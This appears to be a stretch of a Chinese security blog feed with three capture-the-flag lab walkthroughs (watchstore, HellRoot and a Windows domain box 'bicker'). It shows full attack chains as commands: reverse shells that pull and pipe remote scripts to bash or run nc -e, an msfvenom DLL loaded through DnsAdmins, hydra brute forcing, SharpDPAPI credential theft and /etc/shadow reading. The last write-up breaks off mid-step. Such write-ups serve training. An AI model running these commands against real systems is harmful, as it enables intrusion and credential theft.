┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.152
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 07:42 EDT
Nmap scan report for watchstore.thl (192.168.205.152)
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:E0:02:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描发现主机开放了 `22` (SSH) 和 `8080` (http-proxy) 两个端口。访问8080端口的Web服务时，页面跳转到了域名 `watchstore.thl`。

## **1.3 本地DNS解析配置**

为了正常访问该网站，需要将域名与IP地址的映射关系添加到本地的 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.152 watchstore.thl
```

## **1.4 Web目录扫描**

配置好hosts后，使用 `gobuster` 对网站进行目录扫描，寻找隐藏的路径或功能点。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://watchstore.thl:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
===============================================================
...
===============================================================
/products             (Status: 200) [Size: 772]
/read                 (Status: 500) [Size: 13133]
/console              (Status: 200) [Size: 1563]
...
```

扫描发现了几个关键路径，其中 `/read` 返回了500错误，`/console` 页面似乎是一个控制台。

# **二、漏洞挖掘与利用**

## **2.1 Werkzeug调试器信息泄露**

直接访问 `/read` 路径，服务器返回了一个详细的错误页面。这是一个由 Werkzeug 启动的调试器界面，通常在开发环境中出现，当Web应用在调试模式（Debug Mode）下运行时，若程序出现未被捕获的异常，就会展示该页面。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://watchstore.thl:8080/read'
...
&lt;h1&gt;Exception&lt;/h1&gt;
&lt;div class='detail'&gt;
  &lt;p class='errormsg'&gt;Exception: Falta el parámetro &amp;#x27;id&amp;#x27;
&lt;/p&gt;
&lt;/div&gt;
&lt;h2 class='traceback'&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
...
  &lt;h4&gt;File &lt;cite class='filename'&gt;'/home/relox/watchstore/app.py'&lt;/cite&gt;,
      line &lt;em class='line'&gt;65&lt;/em&gt;,
      in &lt;code class='function'&gt;read_file&lt;/code&gt;&lt;/h4&gt;
...
  &lt;blockquote&gt;Exception: Falta el parámetro 'id'
&lt;/blockquote&gt;
...
```

这个报错页面泄露了以下关键信息：
1.  **错误原因**：提示 'Falta el parámetro 'id''，说明 `/read` 路由需要一个名为 `id` 的参数。
2.  **绝对路径**：暴露了应用程序的绝对路径 `/home/relox/watchstore/app.py`。
3.  **漏洞类型**：从函数名 `read_file` 和参数 `id` 推断，这里可能存在任意文件读取（LFI）漏洞。
4.  **调试控制台**：Werkzeug调试器通常包含一个交互式控制台，可以通过 PIN 码解锁后执行任意Python代码。

## **2.2 任意文件读取漏洞利用**

利用上一步发现的LFI漏洞和泄露的绝对路径，尝试读取 `app.py` 文件的源代码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py'

&lt;pre&gt;import os
os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'

from flask import Flask, render_template, request, abort, redirect
...
@app.route('/read')
def read_file():
    filepath = request.args.get('id')
    if not filepath:
        raise Exception('Falta el parámetro 'id'')  # Esto mostrará el traceback
    try:
        with open(filepath, 'r') as f:
            content = f.read()
    except Exception as e:
        content = f'No se pudo leer el archivo: {e}'
    return f'&lt;pre&gt;{content}&lt;/pre&gt;'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
&lt;/pre&gt;
```

成功读取到 `app.py` 的源代码。代码中明确指出了 `debug=True`，并且硬编码了 **Werkzeug 调试器的PIN码：`612-791-734`**。

## **2.3 获取反向Shell**

有了PIN码，就可以利用之前发现的 `/console` 路径来执行任意代码。

1.  访问 `http://watchstore.thl:8080/console`。
2.  在PIN码输入框中输入 `612-791-734` 解锁控制台。
3.  在控制台中输入可以反弹shell的Python代码。这里使用 `wget` 下载并执行远程脚本的方式。

```python
import os
os.system('busybox wget 192.168.205.128/reverse.sh -O - | bash')
```

执行后，在本地监听的端口成功接收到来自目标服务器的shell。

# **三、权限提升**

## **3.1 初步立足与信息收集**

获取初始shell后，进行简单的环境配置和信息收集。

```bash
# 稳定shell
relox@thehackerslabs-watchstore:~/watchstore$ export TERM=xterm
relox@thehackerslabs-watchstore:~/watchstore$ export SHELL=/bin/bash
relox@thehackerslabs-watchstore:~/watchstore$ stty rows 24 columns 80

# 查看当前目录和上级目录
relox@thehackerslabs-watchstore:~/watchstore$ ls -al
...
-rw-r--r-- 1 relox relox 2212 jun 16 10:57 app.py
...
relox@thehackerslabs-watchstore:~$ ls -al
...
-rw-r--r-- 1 relox relox   33 jun 16 11:10 user.txt
...

# 读取user flag
relox@thehackerslabs-watchstore:~$ cat user.txt 
43209bbbe021f88cf1a53b9e5da8a
```

接下来，使用 `sudo -l` 命令检查当前用户 `relox` 的 `sudo` 权限。

```bash
relox@thehackerslabs-watchstore:~$ sudo -l
...
User relox may run the following commands on thehackerslabs-watchstore:
    (root) NOPASSWD: /usr/bin/neofetch
```

结果显示，`relox` 用户可以无需密码以 `root` 身份执行 `/usr/bin/neofetch` 命令。

## **3.2 利用 neofetch Sudo 提权**

查询 [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo) 可知，`neofetch` 可以通过 `--config` 参数加载一个自定义配置文件。如果这个配置文件中的内容是可执行的命令，`neofetch` 会在启动时执行它。

利用此特性，可以构造一个恶意的配置文件来获取 `root` shell。

1.  创建一个文件，内容为执行 `/bin/bash`。

    ```bash
    relox@thehackerslabs-watchstore:~$ echo 'exec /bin/bash' &gt; shell_config
    ```

2.  使用 `sudo` 和 `--config` 参数指定该文件来运行 `neofetch`。

    ```bash
    relox@thehackerslabs-watchstore:~$ sudo /usr/bin/neofetch --config shell_config
    ```

命令执行后，成功获得了 `root` 权限的shell。

## **3.3 获取 Root Flag**

最后，读取 `/root` 目录下的 `root.txt` 文件，完成提权。

```bash
root@thehackerslabs-watchstore:/home/relox# cat /root/root.txt 
c3ab266a11de0294257eaef3571bdf37
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_watchstore.html</guid><pubDate>Mon, 18 Aug 2025 11:49:27 +0000</pubDate></item><item><title>thl_HellRoot</title><link>https://7r1UMPHK.github.io/post/thl_HellRoot.html</link><description># **一、信息收集**

首先，对目标网段进行主机发现。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.144 08:00:27:d0:16:be       PCS Systemtechnik GmbH
...
```

确定目标主机IP为 `192.168.205.144` 后，对其进行全端口扫描，发现开放了多个服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.144
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
...
```

# **二、捷径：SSH爆破**

在深入探索之前，发现了一个极其简单的提权路径。通过对SSH服务进行弱口令爆破，可以迅速获得root权限。

准备一个简单的用户字典：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'root\nadmin\n' &gt; user
```

使用`hydra`工具和一个常用密码字典（此处为`5000q.txt`）进行爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -L user -P 5000q.txt ssh://192.168.205.144 -f -I -u -e nsr -t 64 
...
[22][ssh] host: 192.168.205.144   login: root   password: 12345
...
```

成功爆破出root用户的密码为 `12345`。直接登录即可完成靶机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.144
...
root@hellroot:~# cat /home/astro/user.txt /root/root.txt 
f220dcf45ccfc10c4c44ea8c413186f2
f039facf1ae0d69b07484df1c4da32df
```

# **三、常规路径：Web渗透**

接下来，我们探索预设的、更具挑战性的攻击路径。

## **1. Gitea代码审计**

访问目标80端口，页面为Apache默认页，无可用信息。访问443端口，发现页面跳转至 `git.hellroot.thl`。我们将此域名与目标IP绑定到 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts
192.168.205.144 git.hellroot.thl
```

重新访问 `https://git.hellroot.thl`，发现是一个 Gitea 服务（版本1.24.3）。其中存在一个名为 `Astro/hellroot.thl` 的公开代码仓库。

在仓库的 `Dockerfile` 文件中，发现了一组凭据：`astro:iloveastro`。

在 `index.php` 文件中，我们审计到一段存在命令执行漏洞的代码。该代码运行在5000端口。

```php
&lt;?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // ...

    if ($decoded !== false &amp;&amp; ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2&gt;&amp;1'); // 存在命令注入
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec('nslookup $safeDomain 2&gt;&amp;1');
        }
    } else {
        // ...
    }
    // ...
}
?&gt;
```

代码逻辑显示，如果POST请求的`domain`参数经过十六进制解码后包含分号`;`，则会直接拼接到`shell_exec`函数中执行，造成远程命令执行（RCE）漏洞。

## **2. RCE漏洞利用**

我们可以将任意命令转换为十六进制字符串来绕过过滤并执行。首先，测试`id;`命令，其十六进制为`69643b`。在5000端口的服务上提交该payload，成功执行。

为了获取一个交互式Shell，我们构造一个反弹Shell的payload。目标主机存在`nc`，因此使用`nc`进行反弹。

**Payload**: `nc 192.168.205.128 8888 -e /bin/bash;`
**Hex编码**: `6e63203139322e3136382e3230352e3132382038383838202d65202f62696e2f626173683b`

在Kali上开启监听，并提交上述Payload，成功接收到反弹Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.144] 59278
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

当前用户为 `www-data`，这是一个Docker容器内的低权限用户。

# **四、Docker内提权与流量嗅探**

在当前目录下发现一个提示文件`sniff.txt`，内容为西班牙语，意为“有些工具可以让你嗅探流量”。同时在`.config/dpkg-l.txt`文件中发现系统安装了`tcpdump`。

这提示我们需要进行流量抓包。使用之前在`Dockerfile`中找到的密码 `astro:iloveastro` 切换到`astro`用户。

```bash
www-data@05cc10128c04:/var/www/html$ su astro
Password: iloveastro
$
```

查看`astro`用户的`sudo`权限，发现其可以无密码切换到root。

```bash
astro@05cc10128c04:/var/www/html$ sudo -l
...
User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
```

切换到root用户，并使用`tcpdump`在`eth0`网卡上进行抓包。

```bash
astro@05cc10128c04:/var/www/html$ sudo su
root@05cc10128c04:/var/www/html# tcpdump -i eth0 -A -w /tmp/a.pcap
```

让`tcpdump`运行一段时间后，将抓取到的数据包`a.pcap`传送到Kali攻击机进行分析。

使用Wireshark打开`a.pcap`，通过HTTP协议过滤器，发现一个POST请求，其中包含一个登录凭据。这很可能是主机上的定时任务在执行。

*   **username**: `astro`
*   **password**: `wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS`

# **五、主机提权**

我们获得了主机`astro`用户的密码，现在可以从Docker容器横向移动到主机系统。

使用新密码SSH登录主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh astro@192.168.205.144
...
astro@hellroot:~$ 
```

登录后，寻找提权方法。首先检查SUID文件。

```bash
astro@hellroot:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/usr/local/bin/secmonitor
/usr/local/bin/logview
...
```

发现两个可疑的自定义SUID程序：`secmonitor`和`logview`。逐一进行测试。

`logview`程序用于查看日志文件，但其实现存在目录穿越漏洞。程序会将用户输入的文件名拼接到`/var/log/`目录下，但未对`../`进行过滤。

```bash
astro@hellroot:~$ /usr/local/bin/logview /root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log//root/root.txt
fopen: No such file or directory
```

利用目录穿越漏洞，我们可以读取任意文件，例如`root.txt`。

```bash
astro@hellroot:~$ /usr/local/bin/logview ../../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../../root/root.txt
f039facf1ae0d69b07484df1c4da32df
```

同理，我们可以读取 `/etc/shadow` 文件，获取所有用户的密码哈希。将root用户的哈希进行破解，可以得到密码为`12345`，与最初SSH爆破的结果一致。至此，通过常规路径也成功获取了root权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_HellRoot.html</guid><pubDate>Sun, 17 Aug 2025 14:15:54 +0000</pubDate></item><item><title>内部_bicker</title><link>https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</link><description># **一、信息收集**

## 1. 主机发现

渗透测试的起点是在目标网络中识别存活主机。我们通过 `arp-scan` 对本地网段进行扫描，以定位我们的目标。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l      
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.149 00:0c:29:07:21:7a       VMware, Inc.
192.168.205.254 00:50:56:ff:e4:86       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded
```
扫描结果明确指向 `192.168.205.149` 为本次测试的目标主机。

## 2. 端口与服务扫描

确定目标 IP 后，使用 Nmap 进行深度探测，以绘制出目标的攻击面。首先进行全端口 TCP 连接扫描，确保不遗漏任何开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 -sT -T4 192.168.205.149 -oA nmapscan/ports 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:37 EDT
Nmap scan report for bicker.com (192.168.205.149)
Host is up (0.00048s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
63661/tcp open  unknown
63662/tcp open  unknown
63682/tcp open  unknown
MAC Address: 00:0C:29:07:21:7A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 90.01 seconds
```
在识别出开放端口后，我们针对这些端口进行更详细的服务版本探测和默认脚本扫描，以获取操作系统、域名、主机名等关键信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,63661,63662,63682 -sC -sV -T4 192.168.205.149 -oA nmapscan/xiports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:40 EDT
Nmap scan report for bicker.com (192.168.205.149)
Host is up (0.00023s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-16 13:40:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bicker.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
...
| rdp-ntlm-info: 
|   Target_Name: BICKER
|   NetBIOS_Domain_Name: BICKER
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: bicker.com
|   DNS_Computer_Name: dc.bicker.com
...
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
...
```

**扫描结果分析与解读：**
综合扫描结果，目标主机的画像变得极为清晰：这是一台主机名为 `DC` 的 Windows 域控制器，其 DNS 域名为 `bicker.com`。大量开放的 AD 相关端口（Kerberos, LDAP, SMB）证实了这一点。一个重要的发现是 SMB 签名被强制启用（`Message signing enabled and required`），这增加了网络层的安全性，可以有效防御 NTLM Relay 等中间人攻击。

| 端口          | 服务          | 作用/风险提示                                                |
| ------------- | ------------- | ------------------------------------------------------------ |
| **53/tcp**    | DNS           | 域名系统，可用于枚举 SRV 记录，绘制域内服务拓扑。            |
| **88/tcp**    | Kerberos      | 域认证核心，是进行用户名枚举（Kerbrute）和 AS-REP Roasting 攻击的切入点。 |
| **139/445**   | SMB           | 文件共享服务，可用于枚举共享、检查 Null Session 漏洞。       |
| **389/636**   | LDAP/LDAPS    | 轻量级目录访问协议，是查询 AD 数据库以获取用户、组、OU 等信息的标准接口。 |
| **3268/3269** | 全局编录 (GC) | AD林的索引服务，允许在不知道对象所在域的情况下进行快速搜索。 |
| **5985/tcp**  | WinRM (HTTP)  | Windows 远程管理服务，获得凭据后，这是执行 PowerShell 命令、实现交互式控制的首选通道。 |
| **3389/tcp**  | RDP           | 远程桌面协议，是图形化登录的入口，可用于凭据爆破或哈希传递。 |

## 3. Active Directory 服务枚举

在确认目标为域控后，我们针对其核心服务进行更具针对性的信息收集。

*   **DNS SRV 记录查询**
    通过 `dig` 查询 SRV 记录，可以精确地确认提供关键服务的服务器主机名。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ dig @192.168.205.149 -t SRV _kerberos._tcp.bicker.com
    ...
    ;; ANSWER SECTION:
    _kerberos._tcp.bicker.com. 600  IN      SRV     0 100 88 dc.bicker.com.
    ...
    ```
    查询结果进一步证实了 Kerberos (KDC), LDAP, 和全局编录 (GC) 服务均由 `dc.bicker.com` (`192.168.205.149`) 提供。

*   **LDAP 匿名绑定探测**
    尝试在未提供任何凭据的情况下查询 LDAP，探测是否存在允许匿名枚举的常见配置错误。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ ldapsearch -x -H ldap://192.168.205.149 -b 'DC=bicker,DC=com'
    # extended LDIF
    ...
    # search result
    search: 2
    result: 1 Operations error
    text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
     tion a successful bind must be completed on the connection., data 0, v4f7c
    
    # numResponses: 1
    ```
    服务器拒绝了匿名查询，表明其 LDAP 服务进行了基本的安全加固。

*   **Kerberos 用户名枚举**
    利用 Kerberos 协议在处理用户存在与否时返回不同错误代码的特性，可以使用 `kerbrute` 等工具高效地验证用户名列表。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ kerbrute userenum --dc 192.168.205.149 -d bicker.com /usr/share/seclists/Usernames/cirt-default-usernames.txt 
    ...
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Administrator@bicker.com
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Guest@bicker.com
    ...
    ```
    该步骤成功验证了 `administrator`, `guest` 等多个内置账户的存在，为后续的凭据攻击提供了目标。

*   **AS-REP Roasting 攻击尝试**
    这是一种针对禁用了 Kerberos 预身份验证的用户的攻击。如果存在此类用户，攻击者可以为其请求 TGT，并离线爆破其中包含的加密数据以获取用户密码。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile hash
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
    
    [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
    ```
    尝试失败，表明目标域中的用户均开启了预身份验证，此攻击路径无效。

# **二、初步突破**

## 1. SMB 匿名共享探测

尽管 LDAP 匿名绑定被禁用，但 SMB 服务可能存在独立的访问控制配置。我们检查是否存在无需凭据即可访问的共享。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.149 -N   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      远程管理
        C$              Disk      默认共享
        IPC$            IPC       远程 IPC
        NETLOGON        Disk      Logon server share 
        puppy           Disk      
        SYSVOL          Disk      Logon server share 
...
```
发现了一个名为 `puppy` 的匿名可读共享，这是一个潜在的信息泄露点。我们连接该共享并下载其中的文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.149/puppy -N
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Aug 15 00:06:51 2025
  ..                                DHS        0  Fri Aug 15 05:20:46 2025
  puppy.jpg                           A    57634  Fri Aug 15 00:06:51 2025

                12923135 blocks of size 4096. 9313382 blocks available
smb: \&gt; get puppy.jpg
getting file \puppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)
smb: \&gt; exit
```

## 2. 开源情报 (OSINT) 获取凭据

对下载的 `puppy.jpg` 文件进行分析，寻找可能存在的线索。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings puppy.jpg|head -n 10        
JFIF
Exif
bilibili
Google
uid=3546958956333518
0220
 , #&amp;')*)
-0-(0%()(
((((((((((((((((((((((((((((((((((((((((((((((((((
a2#q
```
文件字符串中包含一个 Bilibili UID (`3546958956333518`)。通过在 Bilibili 网站上搜索此 UID，我们找到了一个用户发布的动态，其中直接泄露了一组凭据：
**`tindalos:Th3C@ll0fCtHu1hu!`**

## 3. 获得初始 Shell

利用这组意外获得的凭据，我们尝试通过之前发现的 WinRM 服务 (端口 5985) 登录目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ evil-winrm -i 192.168.205.149 -u 'tindalos' -p 'Th3C@ll0fCtHu1hu!'
                                        
Evil-WinRM shell v3.7
...                                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tindalos\Documents&gt;
```
连接成功！我们获得了一个属于域用户 `bicker\tindalos` 的交互式 PowerShell Shell，完成了初步突破。

# **三、权限提升**

## 1. 内部信息收集与态势感知

立足于当前 Shell，首要任务是全面了解 `tindalos` 用户的权限和在域中的角色。

```powershell
*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; whoami /all

用户信息
----------------
用户名          SID
=============== ============================================
bicker\tindalos S-1-5-21-298176814-2846777796-698167141-1103

组信息
-----------------
组名                                        类型   SID                                          属性
=========================================== ====== ============================================ ======================================
...
BICKER\DnsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用于组, 本地组
...
```
**关键发现：** `whoami /all` 的输出显示，用户 `tindalos` 隶属于 `DnsAdmins` 组。这是一个极度危险的内置组，其成员通常可以通过滥用 DNS 服务配置来实现权限提升至域控的 `SYSTEM`。

## 2. 提权路径分析：两条道路

基于 `DnsAdmins` 的权限，我们有两条提权路径可选：

1.  **捷径（高噪音）：** 直接配置恶意 DLL，然后通过重启整个靶机来触发执行。此方法简单粗暴，但动静巨大，在真实环境中应极力避免。
2.  **预期解（低噪音）：** 深入挖掘信息，寻找一个拥有重启 DNS 服务权限的用户，通过一系列横向移动，最终在不重启服务器的情况下触发漏洞。

## 3. 提权路径一：捷径（重启靶机）

此路径利用 `DnsAdmins` 权限设置好后门，然后通过重启靶机这一“歪门邪道”来完美跳关。

*   **生成恶意 DLL**
    使用 `msfvenom` 创建一个反向连接 Shell 的 DLL。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f dll -o dns.dll
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of dll file: 9216 bytes
    Saved as: dns.dll
    ```
*   **上传并配置 DLL**
    在 `tindalos` 的 Shell 中，从 Kali 下载此 DLL，并使用 `dnscmd.exe` 将其注册为 `ServerLevelPluginDll`。
    ```powershell
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/dns.dll' -OutFile 'C:\Users\tindalos\Documents\dns.dll'
    
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; dnscmd.exe localhost /config /serverlevelplugindll C:\Users\tindalos\Documents\dns.dll
    
    注册属性 serverlevelplugindll 成功重置。
    命令成功完成。
    ```
*   **监听并（模拟）重启**
    在 Kali 上开启监听。此时，通过虚拟化管理平台重启目标服务器，即可触发 DLL 加载。
    
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ nc -lvnp 8888                                                 
    listening on [any] 8888 ...
    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 62282
    Microsoft Windows [�汾 10.0.20348.169]
    (c) Microsoft Corporation����������Ȩ����
    
    C:\Windows\system32&gt;whoami
    nt authority\system
    ```
    此路径虽然可行，但绕过了靶机设计的核心挑战。

## 4. 提权路径二：预期解（精准权限利用）

这条路径考验的是在受限环境下的深度信息挖掘和横向移动能力，是更为专业和隐蔽的手法。

### 4.1. 本地凭据挖掘

*   **枚举域用户**
    为规划横向移动路径，我们枚举域内的其他用户及其组关系。
    ```powershell
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user jianyin /domain
    ...
    全局组成员             *Domain Users         *DNSRestarters
    *Evil-WinRM* PS C:\Users\tindalos\Documents&gt; net user lihua /domain
    ...
    全局组成员             *Domain Users         *AccountModifier
    ```
    发现了两个关键的自定义组：`DNSRestarters` 和 `AccountModifier`。
*   **绕过 Windows Defender**
    尝试执行`Seatbelt.exe`被 Defender 拦截。通过探索发现 `C:\wirteTEMP` 是一个白名单目录，后续工具均在此目录下执行。
*   **利用 DPAPI 解密凭据**
    **技术背景**：Windows 使用数据保护 API (DPAPI) 来加密存储在用户配置文件中的敏感信息。由于我们已知 `tindalos` 的明文密码，可以解密其 DPAPI 主密钥，进而解密由它保护的其他凭据。
    ```powershell
    *Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/SharpDPAPI.exe' -OutFile 'C:\wirteTEMP\SharpDPAPI.exe'
    *Evil-WinRM* PS C:\wirteTEMP&gt; ./SharpDPAPI.exe credentials /unprotect /credfile:'C:\Users\tindalos\AppData\Roaming\Microsoft\Credentials\A2E4656BCBABFD9279E090E8482A7141' /sid:S-1-5-21-298176814-2846777796-698167141-1103 /password:'Th3C@ll0fCtHu1hu!'
    ...
      CredFile           : A2E4656BCBABFD9279E090E8482A7141
        ...
        UserName         : lihua
        Credential       : hello%2633
    ...
    ```
    执行成功！我们从 `tindalos` 的本地存储中，解密出了另一位用户 `lihua` 的明文密码：`hello%2633`。

### 4.2. 横向移动与 ACL 深度枚举

获得了 `lihua` 的凭据，我们立即横向移动到该用户的会话中，并深入挖掘其所属的 `AccountModifier` 组到底拥有何种权限。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.149 -u 'lihua' -p 'hello%2633'
...
*Evil-WinRM* PS C:\Users\lihua\Documents&gt; whoami
bicker\lihua
```
为了精确枚举 Active Directory 的访问控制列表 (ACL)，我们上传并加载强大的 `PowerView.ps1` 脚本。

```powershell
*Evil-WinRM* PS C:\wirteTEMP&gt; Invoke-WebRequest -Uri 'http://192.168.205.128/PowerView.ps1' -OutFile 'C:\wirteTEMP\pv.ps1'

*Evil-WinRM* PS C:\wirteTEMP&gt; . .\pv.ps1
```
加载后，我们使用 PowerView 查询 `AccountModifier` 组具体对 `jianyin` 用户拥有哪些权限。

```powershell
*Evil-WinRM* PS C:\wirteTEMP&gt; Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ObjectDN -match 'jianyin' } | Format-List *

ObjectDN                : CN=jianyin,CN=Users,DC=bicker,DC=com
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight
ObjectAceType           : User-Force-Change-Password
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-2107
IdentityReferenceName   : AccountModifier
IdentityReferenceDomain : bicker.com
IdentityReferenceDN     : CN=AccountModifier,CN=Users,DC=bicker,DC=com
IdentityReferenceClass  : group
```
**分析结果**：输出极为精确地告诉我们，`AccountModifier` 组对 `jianyin` 用户对象拥有的并非通用写入权，而是一项特定的**扩展权限 (Extended Right)**：`User-Force-Change-Password`。

### 4.3. 精准利用 ACL 控制用户

要利用这一特定的委派权限，必须使用能够调用相应 ADSI 接口的工具。PowerView 的 `Set-DomainUserPassword` 函数正是为此设计的。

*   **处理 `SecureString`**
    **技术背景**：为安全起见，现代 PowerShell cmdlet 通常要求密码参数为 `SecureString` 类型，这是一种在内存中加密存储的字符串对象。我们需要先将明文密码进行转换。
    ```powershell
